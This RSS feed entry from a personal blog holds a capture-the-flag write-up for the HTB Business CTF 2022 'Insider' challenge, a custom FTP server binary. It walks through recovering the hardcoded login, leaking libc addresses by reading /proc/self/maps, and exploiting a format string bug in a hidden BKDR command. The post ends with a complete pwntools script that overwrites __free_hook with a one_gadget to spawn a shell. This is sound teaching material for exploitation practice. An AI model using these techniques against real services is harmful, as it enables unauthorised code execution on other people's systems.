<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>format string on Anvbis</title><link>https://anvbis.github.io/tags/format-string/</link><description>Recent content in format string on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Sun, 17 Jul 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/tags/format-string/index.xml" rel="self" type="application/rss+xml"/><item><title>HTB Business CTF 2022 :: Insider</title><link>https://anvbis.github.io/posts/htbbizctf-2022-insider/</link><pubDate>Sun, 17 Jul 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/htbbizctf-2022-insider/</guid><description>Reverse Engineering We&amp;rsquo;ll start by running file to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.
$ file ./chall ./chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8bdf868a7d36a356638d98d3299887ae81995e2e, stripped Running pwntools' checksec tool reveals that there is no stack canary in place - so if we found a buffer overflow present in the binary it&amp;rsquo;d be trivial to exploit.</description><content>&lt;h2 id="reverse-engineering">Reverse Engineering&lt;/h2>
&lt;p>We&amp;rsquo;ll start by running &lt;code>file&lt;/code> to get an idea of the executable&amp;rsquo;s architecture and platform. Note that it is a 64-bit linux executable.&lt;/p>
&lt;pre>&lt;code>$ file ./chall
./chall: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8bdf868a7d36a356638d98d3299887ae81995e2e, stripped
&lt;/code>&lt;/pre>&lt;p>Running pwntools' &lt;code>checksec&lt;/code> tool reveals that there is no stack canary in place - so if we found a buffer overflow present in the binary it&amp;rsquo;d be trivial to exploit. All other protections are in place so we&amp;rsquo;ll likely need to leak a libc address in order to progress further.&lt;/p>
&lt;pre>&lt;code>$ checksec ./chall
[*] './chall'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: No canary found
NX: NX enabled
PIE: PIE enabled
RUNPATH: b'./'
&lt;/code>&lt;/pre>&lt;p>When we run the binary, it appears to be a custom implementation of an FTP server. Inputting common commands tells us that we need to find a way to either provide valid credentials, or bypass the login functionality.&lt;/p>
&lt;pre>&lt;code>$ ./chall
220 Blablah FTP
USER asdf
530 Cannot find user name. Do you belong here.
PASS asdf
530 Need login. Login first.
RETR asdf
530 Need login. Login first.
&lt;/code>&lt;/pre>&lt;p>Viewing the disassembly we can find the control-flow logic for the &amp;lsquo;USER&amp;rsquo; command. Interestingly, it provides two possible paths to sign in. In the first path it calls some function on the input username in order to validate the login. In the second path it calls &lt;code>getspnam&lt;/code> to check for a valid username.&lt;/p>
&lt;p>&lt;img src="https://anvbis.github.io/img/htbbizctf-2022-insider-1.png" alt="">&lt;/p>
&lt;p>Taking a look at that first mysterious function shows that it&amp;rsquo;s just a wrapper for &lt;code>strcmp&lt;/code>. Let&amp;rsquo;s spin up GDB and find out what it&amp;rsquo;s comparing our input to. We can just place a breakpoint just before the &lt;code>strcmp&lt;/code> call.&lt;/p>
&lt;pre>&lt;code>$ gdb ./chall
...
pwndbg&amp;gt; b *(0x555555554000 + 0x00002a3f)
Breakpoint 2 at 0x555555556a3f
pwndbg&amp;gt; r
Starting program: ./chall
220 Blablah FTP
USER AAAA
Breakpoint 2, 0x0000555555556a3f in ?? ()
...
► 0x555555556a3f call strcmp@plt &amp;lt;strcmp@plt&amp;gt;
s1: 0x55555555a225 ◂— 0x41414141 /* 'AAAA' */
s2: 0x5555555580a0 ◂— 0x6c4220642500293b /* ';)' */
&lt;/code>&lt;/pre>&lt;p>It&amp;rsquo;s plain to see that the program considers the input &lt;code>;)&lt;/code> to be a valid username for authentication purposes. Giving this as input confirms this theory.&lt;/p>
&lt;pre>&lt;code>$ ./chall
220 Blablah FTP
USER ;)
331 User name okay need password
&lt;/code>&lt;/pre>&lt;p>Repeating the above steps for the &amp;lsquo;PASS&amp;rsquo; command gives us the same result. So we now have valid credentials for the target application.&lt;/p>
&lt;p>&lt;img src="https://anvbis.github.io/img/htbbizctf-2022-insider-2.png" alt="">&lt;/p>
&lt;pre>&lt;code> ► 0x555555556a3f call strcmp@plt &amp;lt;strcmp@plt&amp;gt;
s1: 0x55555555a225 ◂— 'PASSWORD'
s2: 0x5555555580a0 ◂— 0x6c4220642500293b /* ';)' */
&lt;/code>&lt;/pre>&lt;pre>&lt;code>$./chall
USER ;)
331 User name okay need password
PASS ;)
230 User logged in proceed
&lt;/code>&lt;/pre>&lt;p>Finally, we want to see what commands are available to us. Looking at the strings in our disassembler gives us this information.&lt;/p>
&lt;pre>&lt;code> 0x4008 USER
0x400d PASS
0x4012 RETR
0x4017 STOR
0x401c STOU
0x4021 APPE
0x4026 REST
0x402b RNFR
0x4030 RNTO
0x4035 ABOR
0x403a DELE
0x404f CDUP
0x4054 LIST
0x4059 NLST
0x405e SITE
0x4063 STAT
0x4068 HELP
0x406d NOOP
0x4072 TYPE
0x4077 PASV
0x407c PORT
0x4081 SYST
0x4086 QUIT
0x408b MDTM
0x4090 SIZE
&lt;/code>&lt;/pre>&lt;h2 id="finding-the-vulnerability">Finding the Vulnerability&lt;/h2>
&lt;p>First thing I attempted was to actually just read the contents of &lt;code>flag.txt&lt;/code> via the &amp;lsquo;RETR&amp;rsquo; command. Sadly our user did not have permission to read the file. Though we do have a file read - maybe we can utilise that for something interesting (more on this later).&lt;/p>
&lt;pre>&lt;code>$ ./chall
220 Blablah FTP
USER ;)
331 User name okay need password
PASS ;)
230 User logged in proceed
RETR /flag.txt
500 FTP error: access denyed. Check Permission
RETR /etc/passwd
&amp;lt;censored&amp;gt;
226 Transfer completed
&lt;/code>&lt;/pre>&lt;p>After a little more exploration, finding the actual vulnerability present in the executable was remarkably easy. Just by providing various inputs (long strings, format strings, etc) to the different commands - I found a format string vulnerability in the &amp;lsquo;BKDR&amp;rsquo; command.&lt;/p>
&lt;pre>&lt;code>$ ./chall
220 Blablah FTP
USER ;)
331 User name okay need password
PASS ;)
230 User logged in proceed
BKDR %p %p %p
431136 BKDR 0x3 0xa0d (nil)
&lt;/code>&lt;/pre>&lt;p>Great, now we have an arbitrary write via the format string vulnerability we found. We only need two more things in order to build an exploit:&lt;/p>
&lt;ul>
&lt;li>A libc address leak (to get symbol locations).&lt;/li>
&lt;li>Something to overwrite (that&amp;rsquo;ll give us code execution).&lt;/li>
&lt;/ul>
&lt;p>We could use this format string we found to leak an address in lib, but that would be boring. Instead, we can use the &amp;lsquo;RETR&amp;rsquo; command to leak the entirety of the process map! That&amp;rsquo;s definitely a fun way to leak process addresses.&lt;/p>
&lt;pre>&lt;code>$ ./chall
220 Blablah FTP
USER ;)
331 User name okay need password
PASS ;)
230 User logged in proceed
RETR /proc/self/maps
5561bab83000-5561bab85000 r--p 00000000 fd:00 14944798 ./chall
5561bab85000-5561bab87000 r-xp 00002000 fd:00 14944798 ./chall
5561bab87000-5561bab88000 r--p 00004000 fd:00 14944798 ./chall
5561bab88000-5561bab89000 r--p 00004000 fd:00 14944798 ./chall
5561bab89000-5561bab8a000 rw-p 00005000 fd:00 14944798 ./chall
5561bab8a000-5561bab8b000 rw-p 00000000 00:00 0
5561bab8b000-5561bab8e000 rw-p 00006000 fd:00 14944798 ./chall
5561bcaa9000-5561bcaca000 rw-p 00000000 00:00 0 [heap]
7f9b53c03000-7f9b53c05000 rw-p 00000000 00:00 0
7f9b53c05000-7f9b53c2b000 r--p 00000000 fd:00 14944691 ./libc.so.6
7f9b53c2b000-7f9b53d96000 r-xp 00026000 fd:00 14944691 ./libc.so.6
7f9b53d96000-7f9b53de2000 r--p 00191000 fd:00 14944691 ./libc.so.6
7f9b53de2000-7f9b53de5000 r--p 001dc000 fd:00 14944691 ./libc.so.6
7f9b53de5000-7f9b53de8000 rw-p 001df000 fd:00 14944691 ./libc.so.6
7f9b53de8000-7f9b53df3000 rw-p 00000000 00:00 0
7f9b53df3000-7f9b53df4000 r--p 00000000 fd:00 14944690 ./ld-linux-x86-64.so.2
7f9b53df4000-7f9b53e1c000 r-xp 00001000 fd:00 14944690 ./ld-linux-x86-64.so.2
7f9b53e1c000-7f9b53e26000 r--p 00029000 fd:00 14944690 ./ld-linux-x86-64.so.2
7f9b53e26000-7f9b53e28000 r--p 00032000 fd:00 14944690 ./ld-linux-x86-64.so.2
7f9b53e28000-7f9b53e2a000 rw-p 00034000 fd:00 14944690 ./ld-linux-x86-64.so.2
7ffcda8c6000-7ffcda8e7000 rw-p 00000000 00:00 0 [stack]
7ffcda994000-7ffcda997000 r--p 00000000 00:00 0 [vvar]
7ffcda997000-7ffcda998000 r-xp 00000000 00:00 0 [vdso]
ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall]
226 Transfer completed
&lt;/code>&lt;/pre>&lt;h2 id="information-gathering">Information Gathering&lt;/h2>
&lt;p>Now that we&amp;rsquo;ve found everything we need, we can do a little more information gathering to get the last thing we need for our exploit - the offset within the format string to the input we control on the stack (needed for our arbitrary write). Let&amp;rsquo;s write a quick script to do just that.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./chall&amp;#39;&lt;/span>)
&lt;span style="color:#75715e"># sign in with valid credentials&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>writelineafter(&lt;span style="color:#e6db74">&amp;#39;220 Blablah FTP&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;user ;)&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>writelineafter(&lt;span style="color:#e6db74">&amp;#39;331 User name okay need password&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pass ;)&amp;#39;&lt;/span>)
&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">2000&lt;/span>):
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;bkdr AAAAAAAA %&lt;/span>&lt;span style="color:#e6db74">{&lt;/span>i&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">$p&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;bkdr AAAAAAAA&amp;#39;&lt;/span>)
out &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readline()
&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;4141&amp;#39;&lt;/span> &lt;span style="color:#f92672">in&lt;/span> out:
print(i, out)
r&lt;span style="color:#f92672">.&lt;/span>close()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Running our script, we find that the address we control is located at an offset of 1031.&lt;/p>
&lt;pre>&lt;code>[+] Starting local process './chall': pid 47092
1031 b' 0x4141414141414141 \r\n
[*] Stopped process './chall' (pid 47092)
&lt;/code>&lt;/pre>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;p>Now that we have everything we need, we can begin to write our exploit. There&amp;rsquo;s a few things that we need to achieve, here&amp;rsquo;s a list:&lt;/p>
&lt;ul>
&lt;li>Sign into the program using the credentials we found.&lt;/li>
&lt;li>Leak a libc address via the arbitrary file read.&lt;/li>
&lt;li>Overwrite some address in order to achieve code execution.&lt;/li>
&lt;/ul>
&lt;p>Below are the code snippets for both signing in with the credentials we found, and for leaking a libc address.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e"># sign in with valid credentials&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>writelineafter(&lt;span style="color:#e6db74">&amp;#39;220 Blablah FTP&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;user ;)&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>writelineafter(&lt;span style="color:#e6db74">&amp;#39;331 User name okay need password&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pass ;)&amp;#39;&lt;/span>)
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e"># leak addresses&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>writelineafter(&lt;span style="color:#e6db74">&amp;#39;230 User logged in proceed&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;RETR /proc/self/maps&amp;#39;&lt;/span>)
leak &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;226 Transfer completed&amp;#39;&lt;/span>)
libc_base &lt;span style="color:#f92672">=&lt;/span> int(leak&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;latin&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">10&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;-&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>], &lt;span style="color:#ae81ff">16&lt;/span>)
log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;libc_base = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(libc_base)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;span style="color:#75715e"># set up libc elf&lt;/span>
libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>)
libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So, one more question remains - how do we utilise our arbitrary write primitive in order to achieve code execution? Well, at the end of the programs input routine a call to &lt;code>free&lt;/code> is made. If we write an address to &lt;code>__free_hook&lt;/code> within libc we will be able to redirect program execution.&lt;/p>
&lt;p>&lt;img src="https://anvbis.github.io/img/htbbizctf-2022-insider-3.png" alt="">&lt;/p>
&lt;p>The simplest way to get a shell from this is to use a &amp;lsquo;magic&amp;rsquo; gadget.&lt;/p>
&lt;pre>&lt;code>$ one_gadget libc.so.6
0xde78c execve(&amp;quot;/bin/sh&amp;quot;, r15, r12)
constraints:
[r15] == NULL || r15 == NULL
[r12] == NULL || r12 == NULL
0xde78f execve(&amp;quot;/bin/sh&amp;quot;, r15, rdx)
constraints:
[r15] == NULL || r15 == NULL
[rdx] == NULL || rdx == NULL
0xde792 execve(&amp;quot;/bin/sh&amp;quot;, rsi, rdx)
constraints:
[rsi] == NULL || rsi == NULL
[rdx] == NULL || rdx == NULL
&lt;/code>&lt;/pre>&lt;p>The code snippet below overwrites &lt;code>__free_hook&lt;/code> with our &amp;lsquo;magic&amp;rsquo; gadget, giving us a shell when the call to &lt;code>free&lt;/code> is made.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e"># arbitrary write&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0xde78f execve(&amp;#34;/bin/sh&amp;#34;, r15, rdx)
&lt;/span>&lt;span style="color:#e6db74">constraints:
&lt;/span>&lt;span style="color:#e6db74"> [r15] == NULL || r15 == NULL
&lt;/span>&lt;span style="color:#e6db74"> [rdx] == NULL || rdx == NULL
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
writes &lt;span style="color:#f92672">=&lt;/span> {
libc&lt;span style="color:#f92672">.&lt;/span>sym&lt;span style="color:#f92672">.&lt;/span>__free_hook: libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xde78f&lt;/span>
}
&lt;span style="color:#75715e"># perform format string attack&lt;/span>
payload &lt;span style="color:#f92672">=&lt;/span> fmtstr_payload(&lt;span style="color:#ae81ff">1031&lt;/span>, writes, numbwritten&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;bkdr &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> payload)
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Putting all these pieces together we get the following exploit.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-py" data-lang="py">&lt;span style="color:#75715e">#!/usr/bin/env python3&lt;/span>
&lt;span style="color:#f92672">from&lt;/span> pwn &lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#f92672">*&lt;/span>
context&lt;span style="color:#f92672">.&lt;/span>arch &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;amd64&amp;#39;&lt;/span>
r &lt;span style="color:#f92672">=&lt;/span> process(&lt;span style="color:#e6db74">&amp;#39;./chall&amp;#39;&lt;/span>)
&lt;span style="color:#75715e"># sign in with valid credentials&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>writelineafter(&lt;span style="color:#e6db74">&amp;#39;220 Blablah FTP&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;user ;)&amp;#39;&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>writelineafter(&lt;span style="color:#e6db74">&amp;#39;331 User name okay need password&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;pass ;)&amp;#39;&lt;/span>)
&lt;span style="color:#75715e"># leak addresses&lt;/span>
r&lt;span style="color:#f92672">.&lt;/span>writelineafter(&lt;span style="color:#e6db74">&amp;#39;230 User logged in proceed&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;RETR /proc/self/maps&amp;#39;&lt;/span>)
leak &lt;span style="color:#f92672">=&lt;/span> r&lt;span style="color:#f92672">.&lt;/span>readuntil(&lt;span style="color:#e6db74">&amp;#39;226 Transfer completed&amp;#39;&lt;/span>)
libc_base &lt;span style="color:#f92672">=&lt;/span> int(leak&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;latin&amp;#39;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">10&lt;/span>]&lt;span style="color:#f92672">.&lt;/span>split(&lt;span style="color:#e6db74">&amp;#39;-&amp;#39;&lt;/span>)[&lt;span style="color:#ae81ff">0&lt;/span>], &lt;span style="color:#ae81ff">16&lt;/span>)
log&lt;span style="color:#f92672">.&lt;/span>info(&lt;span style="color:#e6db74">f&lt;/span>&lt;span style="color:#e6db74">&amp;#39;libc_base = &lt;/span>&lt;span style="color:#e6db74">{&lt;/span>hex(libc_base)&lt;span style="color:#e6db74">}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>)
&lt;span style="color:#75715e"># set up libc elf&lt;/span>
libc &lt;span style="color:#f92672">=&lt;/span> ELF(&lt;span style="color:#e6db74">&amp;#39;./libc.so.6&amp;#39;&lt;/span>)
libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">=&lt;/span> libc_base
&lt;span style="color:#75715e"># arbitrary write&lt;/span>
&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;
&lt;/span>&lt;span style="color:#e6db74">0xde78f execve(&amp;#34;/bin/sh&amp;#34;, r15, rdx)
&lt;/span>&lt;span style="color:#e6db74">constraints:
&lt;/span>&lt;span style="color:#e6db74"> [r15] == NULL || r15 == NULL
&lt;/span>&lt;span style="color:#e6db74"> [rdx] == NULL || rdx == NULL
&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&amp;#39;&amp;#39;&lt;/span>
writes &lt;span style="color:#f92672">=&lt;/span> {
libc&lt;span style="color:#f92672">.&lt;/span>sym&lt;span style="color:#f92672">.&lt;/span>__free_hook: libc&lt;span style="color:#f92672">.&lt;/span>address &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">0xde78f&lt;/span>
}
&lt;span style="color:#75715e"># perform format string attack&lt;/span>
payload &lt;span style="color:#f92672">=&lt;/span> fmtstr_payload(&lt;span style="color:#ae81ff">1031&lt;/span>, writes, numbwritten&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">12&lt;/span>)
r&lt;span style="color:#f92672">.&lt;/span>writeline(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;bkdr &amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> payload)
r&lt;span style="color:#f92672">.&lt;/span>clean()
r&lt;span style="color:#f92672">.&lt;/span>interactive()
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And finally, here&amp;rsquo;s our exploit in action. It gives us an interactive shell that we can use to read the flag. In the actual challenge &lt;code>/flag.txt&lt;/code> was not readable (as we discovered when we attempted to read it earlier). However, an SUID binary &lt;code>get_flag&lt;/code> was present on the container, which read the flag for us.&lt;/p>
&lt;pre>&lt;code>$ ./solve.py
[*] libc_base = 0x7ff0d87a1000
[*] './libc.so.6'
Arch: amd64-64-little
RELRO: Partial RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
[*] Switching to interactive mode
$ ls
chall flag.txt get_flag ld-linux-x86-64.so.2 libc.so.6 solve.py
&lt;/code>&lt;/pre></content></item></channel></rss>